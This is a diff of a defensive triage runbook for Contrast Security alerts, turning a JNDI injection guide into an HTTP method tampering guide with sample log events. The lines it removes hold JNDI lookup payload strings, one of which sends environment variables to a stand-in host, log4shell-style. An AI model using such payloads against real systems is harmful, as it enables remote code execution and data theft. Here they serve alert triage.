@@ -1,16 +1,22 @@
+---
+layout: runbook
+title: "HTTP Method Tampering"
+description: "Guide for handling attacks where malicious actors manipulate HTTP methods to bypass authentication, authorization, or other security mechanisms"
+---
+
 <!-- \ or two whitespaces used for line breaks -->
-# JNDI Injection Runbook
+# HTTP Method Tampering Runbook
 
-JNDI injection is a malicious technique where attackers exploit vulnerabilities in web applications to influence the server used in a JNDI lookup. Where an attacker can influence the server the JNDI Lookup is sent to, it is possible to get the server to connect to a malicious JNDI Server which returns a malicious class which when loaded will give the attacker Remote Code Execution on the impacted server. Also in the case of infamous log4shell vulnerability, as well as RCE, it is possible to exfiltrate data fro the impacted server.
+Method Tampering (aka verb tampering or HTTP method tampering) is an attack where an attacker manipulates the HTTP method used in a request to a web application. Providing unexpected HTTP methods can sometimes bypass authentication, authorization or other security mechanisms.
 
 
-Example Event - Exploited outcome JNDI Injection  
-`Oct 17 10:53:34 172.19.0.2 CEF:0|Contrast Security|Contrast Agent Java|6.7.0|SECURITY|The input UNKNOWN had a value that successfully exploited jndi-injection - null|WARN|pri=jndi-injection src=172.19.0.5 spt=8081 request=/registerEmail requestMethod=POST app=Petclinic-burp-demo-jb-2-Email-Service outcome=EXPLOITED`  
+Example Event - Exploited outcome HTTP Method Tampering  
+`Oct 21 08:58:55 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input METHOD had a value that successfully exploited method-tampering - SOMEMETHOD|WARN|pri=method-tampering src=0:0:0:0:0:0:0:1 spt=8080 request=/error requestMethod=com.contrastsecurity.agent.contrastapi_v1_0.RequestMethod$1@1cf573b7 app=webapplication outcome=EXPLOITED`  
   
   
 
-Example Event - Blocked outcome JNDI Injection  
-`Oct 17 12:04:07 172.19.0.2 CEF:0|Contrast Security|Contrast Agent Java|6.7.0|SECURITY|The input UNKNOWN had a value that successfully exploited jndi-injection - null|WARN|pri=jndi-injection src=172.19.0.5 spt=8081 request=/registerEmail requestMethod=POST app=Petclinic-burp-demo-jb-2-Email-Service outcome=BLOCKED`
+Example Event - Blocked outcome HTTP Method Tampering  
+`Oct 21 09:00:03 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input METHOD had a value that successfully exploited method-tampering - SOMEMETHOD|WARN|pri=method-tampering src=0:0:0:0:0:0:0:1 spt=8080 request=/ requestMethod=com.contrastsecurity.agent.contrastapi_v1_0.RequestMethod$1@12076e97 app=webapplication outcome=BLOCKED`
   
   
 
@@ -27,20 +33,15 @@ What is the “outcome” of the event you are triaging? (click to proceed)
 
 ## Exploited
 
-An "Exploited" outcome means Contrast detected an input coming into an application that is then used to create a JNDI Query with the protocol RMI or LDAP.  
+"Exploited" means Contrast detected an abnormal HTTP method used in an incoming request, and the response code was not a 501 or 405 indicating the request was processed.  
 
 To verify this is a true positive, review the following attributes of the event for common indicators:  
 
-- An unknown LDAP or RMI Server.
+- Does the request contain an abnormal HTTP method? (e.g one that is not defined in the HTTP RFC)
+- Is the HTTP response code not a 501 or 405?
+- Does the HTTP method make sense in the context of the application? (e.g a DELETE request to a static resource)
 
 
-
-\
-Examples:
-
-- `jndi:ldap://example.com:1389/jdk8`
-- `jndi:rmi://example.com:1389/jdk8`
-- `jndi:ldap://${env:USER}.${env:USERNAME}.example.com:1389/`  
 
 \
 Does the event appear to be a true positive? (click to proceed)  
@@ -52,19 +53,14 @@ Does the event appear to be a true positive? (click to proceed)
 
 ## Blocked
 
-"Blocked" outcome means Contrast detected an input coming into an application that is then used to create a JNDI Query with the protocol RMI or LDAP and Contrast stopped the Query from executing.  
+"Blocked" means Contrast detected an abnormal HTTP method used in an incoming request, therefore blocked execution of the request.  
 
 To verify this is a true positive, review the following attributes of the event:
 
-- An unknown LDAP or RMI Server.
+- Does the request contain an abnormal HTTP method? (e.g one that is not defined in the HTTP RFC)
+- Is the HTTP response code not a 501 or 405?
+- Does the HTTP method make sense in the context of the application? (e.g a DELETE request to a static resource)
 
-
-\
-Examples:
-
-- `jndi:ldap://example.com:1389/jdk8`
-- `jndi:rmi://example.com:1389/jdk8`
-- `jndi:ldap://${env:USER}.${env:USERNAME}.example.com:1389/`  
 
 
 \
